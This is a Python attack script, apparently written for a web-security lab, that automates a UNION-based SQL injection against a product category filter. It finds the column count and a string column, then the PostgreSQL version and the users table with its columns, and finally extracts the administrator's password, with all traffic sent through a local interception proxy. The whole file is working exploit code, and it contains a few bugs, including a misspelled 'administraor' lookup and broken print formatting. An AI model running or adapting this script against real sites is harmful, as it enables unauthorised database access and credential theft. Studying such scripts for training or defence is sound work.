import requests
import sys
from bs4 import BeautifulSoup
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"
}

def perform_request(url, payload):
    path = "/filter?category=Pets"
    res = requests.get(url + path + payload, verify=False, proxies=proxies)
    return res

def get_num_column(url):
    payload = "' order by "

    for i in range(1,11):
        injection = payload + str(i) +"-- "
        res = perform_request(url,injection)
        if(res.status_code != 200):
            return i-1
        
def get_string_column(url, num_column):
    payload = "' UNION SELECT "

    for i in range (1, num_column + 1):
        payload_list = ["null"] * num_column
        payload_list[i-1] = "'a'"
        injection =payload + ','.join(payload_list) + "-- "

        res = perform_request(url, injection)

        if(res.status_code == 200):
            return i
    return False

def get_DB_version(url):
    payload = "' UNION SELECT version(), null --"
    res = perform_request(url, payload)
    
    soup = BeautifulSoup(res.text, "html.parser")
    version = soup.find(string= re.compile(".*PostgreSQL.*"))
    
    if version:
        return version
    else: 
        return False
    
def get_user_Table(url):
    payload = "' UNION SELECT table_name, null FROM information_schema.tables--"
    res = perform_request(url,payload)
    soup = BeautifulSoup(res.text,"html.parser")
    user_table = soup.find(string=re.compile(".*users.*"))
    if user_table:
        return user_table
    return False

def get_column_name(url,userTable):
    payload = "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = '%s'--" %userTable
    res = perform_request(url,payload)
    soup = BeautifulSoup(res.text,"html.parser")
    username = soup.find(string=re.compile(".*username.*"))
    password = soup.find(string=re.compile(".password."))
    return username, password

def get_admin_password(url, username_col, password_col, table_name):
    payload = "' UNION SELECT %s, %s FROM %s" %(username_col, password_col, table_name)
    res = perform_request(url, payload)
    soup = BeautifulSoup(res.text, "html.parser")
    admin_password = soup.body.find(string="administraor").parent.findNext("td").contents[0]
    return admin_password

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] input invalid")
        print("[-] %s <url>" %sys.argv[0])
        sys.exit(-1)
    
    # number of columns
    num_Columns = get_num_column(url)
    print(num_Columns)

    # check first string containing columns
    string_column = get_string_column(url, num_Columns)
    if string_column:
        print("1st column to contain string: %d" %string_column)
    else:
        print("no string containing column - union Attack not possible")
        sys.exit(-1)

    # find the version of DB
    dbVersion = get_DB_version(url)
    if dbVersion:
        print("DB verbose: %s" %dbVersion)
    else:
        print("version not found")

    #find user table in the DB
    userTable = get_user_Table(url)
    if userTable:
        print("user table name: %s" %userTable)
    else:
        print("user table not found")
        sys.exit(-1)

    #find username and password column in user table
    usernam_col, password_col = get_column_name(url, userTable)
    if usernam_col and password_col:
        print("username column name: %s", usernam_col)
        print("password column name: %s", password_col)
    else:
        print("username or password column not found")
        sys.exit(-1)

    # find administrator's password
    admin_password = get_admin_password(url, usernam_col, password_col, userTable)
    if admin_password:
        print("username: administrator")
        print("password: %s" %admin_password)
    else:
        print("username / password not found")
        sys.exit(-1)
